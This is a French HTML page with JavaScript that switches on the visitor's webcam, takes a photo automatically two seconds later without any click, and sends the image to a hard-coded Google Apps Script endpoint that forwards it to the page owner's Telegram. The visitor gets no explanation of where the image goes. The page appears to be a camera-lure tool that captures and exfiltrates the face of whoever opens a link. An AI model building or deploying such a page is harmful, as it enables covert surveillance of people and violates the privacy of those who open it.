<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>📸 Photo Auto → Telegram</title>
<style>
  body { font-family: sans-serif; background: #111; color: #fff; text-align: center; margin: 0; padding: 20px; }
  video, canvas { max-width: 90%; border-radius: 12px; margin: 10px auto; display: block; }
  #status { margin-top: 10px; color: #4fc3f7; font-size: 18px; }
</style>
</head>
<body>
<h1>📸 Souriez !</h1>
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none;"></canvas>
<div id="status">En attente de la caméra...</div>

<script>
const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbza8l1dv_UCQ1rvWtJ0MpOkhEdQAMjSGJ_xsuCqhx4h2DPSrGf61mTL3tzaDduzUnwPig/exec";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const status = document.getElementById('status');

// 1. Démarrage caméra
navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } })
  .then(stream => {
    video.srcObject = stream;
    video.play();
  })
  .catch(err => { status.textContent = "❌ Caméra refusée : " + err.message; });

// 2. Dès que la vidéo joue vraiment, on attend 2 sec puis photo auto + envoi
video.addEventListener('playing', () => {
  status.textContent = "⏳ Photo dans 2 secondes...";
  setTimeout(prendrePhoto, 2000);
});

function prendrePhoto() {
  if (!video.videoWidth) {
    setTimeout(prendrePhoto, 300); // caméra pas prête, on réessaie
    return;
  }
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.style.display = 'block';

  const base64 = canvas.toDataURL('image/jpeg', 0.9).split(',')[1];
  status.textContent = "📤 Envoi vers Telegram...";
  envoyerVersTelegram(base64);
}

function envoyerVersTelegram(base64Image) {
  fetch(APPS_SCRIPT_URL, {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: JSON.stringify({ image: base64Image, nom: "auto_" + Date.now() + ".jpg" })
  })
  .then(r => r.text())
  .then(txt => {
    console.log("Réponse Apps Script :", txt);
    status.textContent = txt.includes('"ok":true')
      ? "✅ Photo envoyée sur ton Telegram !"
      : "⚠️ Réponse inattendue : " + txt;
  })
  .catch(err => { status.textContent = "❌ Erreur d'envoi : " + err.message; });
}
</script>
</body>
</html>
